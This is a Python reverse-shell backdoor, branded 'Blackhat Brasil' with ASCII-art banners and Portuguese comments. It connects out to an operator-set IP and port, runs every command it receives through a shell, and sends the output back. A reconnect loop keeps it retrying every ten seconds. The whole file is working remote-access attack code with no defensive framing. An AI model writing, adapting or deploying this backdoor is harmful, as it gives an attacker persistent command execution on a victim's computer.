
# -*- coding: utf-8 -*-
import socket
import sys,os
import time
import subprocess


ip = "127.0.0.1"
port = 3301

#"Coneccao"

def connect(ip, port):
	
	try:
		global s
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		
		
		s.send("""
\033[31m     
	 Signature\n\033[0;0m\033[33m
		######    ###     ###   ######  #    #  #####  #       ######  
		#     #  #   #   #   #  #     # #   #  #     # #    #  #     # 
		#     # #     # #     # #     # #  #   #       #    #  #     # 
		######  #     # #     # #     # ###    #       #    #  ######  
		#   #   #     # #     # #     # #  #   #       ####### #     # 
		#    #   #   #   #   #  #     # #   #  #     #      #  #     # 
		#     #   ###     ###   ######  #    #  #####       #  ######  
\033[0;0m
			         ░░░░░░░
			    ░░░░░░░░░░░░░░░░░
			   │░░░░░░░░░░░░░░░░░░░│
			   │░░░░░░░░░░░░░░░░░░░│
			  ░└┐░░░░░░░░░░░░░░░░░┌┘░
			  ░░└┐░░░░░░░░░░░░░░░┌┘░░
			  ░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░
			   ░│██████▌░░░▐██████│░
			   ░│▐███▀▀░░▄░░▀▀███▌│░
			   ─┘░░░░░░░▐█▌░░░░░░░└─
			   ░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░
			    ─┘██▌░░░░░░░▐██└─▄
			     ░░▐█─┬┬┬┬┬┬┬─█▌░░
		             ░░░▀┬┼┼┼┼┼┼┼┬▀░░░
			     ░░░└┴┴┴┴┴┴┴┘░░░
			        ░░░░░░░░░░░
			        				@ajuda para saber mais

""")


		return s
	except Exception as e:
		
		print('[!] Error de conexão [!]')
		return None


#"Comandos Abaixo"		
def listen(s):
	try:		
		while True:
			data = s.recv(1024)
			
			if data[:-1] == '@sair':
				s.close()
				exit(0)
			elif data.startswith('cd ') == True:
				try:
					os.chdir(data[3:].strip('\n'))
				except:
					s.send("[!] Error, impossivel mover de diretorio!\n")
					return s
			elif data.startswith('@systema') == True:
				systema = '%s:%s'%(os.name, sys.platform)
				s.send(systema)
				#return s
			elif data[:-1] == '@ajuda':
				s.send("""\033[33m														
Lista de Comandos 
@sair
@?
@systema
\033[0;0m""")
			elif data[:-1] == '@?':
				s.send("""\033[30m

				____________________111¶¶¶¶1111___________________
				_______________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_______________
				__________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________
				_______1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________
				____1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________
				___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1____________
				_1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11____________
				_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶____________
				¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_1¶¶¶1___________
				_1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶___________
				__1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶¶¶¶¶¶¶¶¶¶___________
				___¶1111¶¶¶¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________
				___1¶¶¶¶111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________
				____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1__________
				_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________
				______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_________
				______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1____
				_______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
				_______1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶1
				________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1__¶¶¶¶¶¶¶¶
				________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶
				______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_____¶¶¶¶¶¶¶¶¶
				____1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1______1¶¶¶¶¶¶¶¶¶1
				___1¶¶¶¶¶1__1¶¶¶¶¶¶¶¶¶¶¶¶¶11_________1¶¶¶¶¶¶¶¶¶¶1_
				___¶¶¶¶¶¶¶________________________1¶¶¶¶¶¶¶¶¶¶¶¶___
				__¶¶¶¶¶¶¶¶¶¶1________________11¶¶¶¶¶¶¶¶¶¶¶¶¶1_____
				__1¶¶¶¶¶¶¶¶¶¶¶¶¶111__1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_______
				___1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1__________
				_____1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1______________
				________111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111____________________

				              Blackhat Brasil
				\033[0;0m""")
				
			else:
			
				cmd(s, data)
	except:
		main(s)
			
#"Comando CMD"
def cmd(s, data):
	try:
		proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		saida = proc.stdout.read() + proc.stderr.read() + '\n' + os.getcwd() +'>'
		s.send(saida)
	except:
		main(s)


#"Controle de de saida"
def main(s):
	if s:
		pass
		#s.close()
	
	while True:
		s_conectado = connect(ip, port)
		if s_conectado:
			listen(s_conectado)
		else:
			time.sleep(10)
s = None
main(s)
